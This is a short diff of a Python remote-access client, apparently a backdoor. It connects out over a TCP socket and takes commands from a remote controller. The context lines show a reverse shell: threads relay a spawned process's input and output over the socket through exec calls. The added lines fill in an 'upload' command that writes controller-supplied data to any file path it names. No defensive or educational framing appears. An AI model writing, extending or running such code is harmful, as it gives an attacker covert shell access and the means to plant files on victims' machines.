@@ -23,6 +23,14 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                 threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
                 threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()
             case 'upload':
-                pass
+                try:
+                    f = open(data[2], 'w')
+                    f.write(data[1])
+                    f.close()
+                except OSError as e:
+                    send_data(sock, e)
+                else:
+                    send_data(sock, 'done')
+
             case 'download':
                 pass
